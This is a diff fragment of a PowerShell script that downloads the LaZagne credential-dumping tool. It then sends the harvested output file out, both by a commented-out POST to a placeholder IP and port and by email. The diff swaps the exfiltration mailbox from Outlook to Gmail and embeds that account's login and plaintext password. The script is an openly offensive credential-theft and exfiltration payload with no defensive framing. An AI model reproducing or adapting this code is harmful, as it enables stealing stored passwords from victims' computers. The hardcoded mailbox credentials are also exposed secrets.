@@ -98,15 +98,15 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 #POST REQUEST
 #Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
 # Mail Exfiltration
-$EmailFrom = "HerbertSwindel@outlook.com"
-$EmailTo = "herbertswindel@gmail.com"
+$EmailFrom = "herbertswindel@gmail.com"
+$EmailTo = "herbertswindel@outlook.com"
 $Subject = "Hier zijn uw gegevens kameraad!"
 $Body = "Met vriendelijke groet, Herbert"
-$SMTPServer = "smtp.outlook.com"
+$SMTPServer = "smtp.gmail.com"
 
 $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
 $SMTPClient.EnableSsl = $true
-$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("HerbertSwindel@outlook.com", "HerbertdePervert69@")
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("herbertswindel@gmail.com", "HerbertdePervert69")
 
 # Send the email with attachment
 $Attachment = "$dir\output.txt"
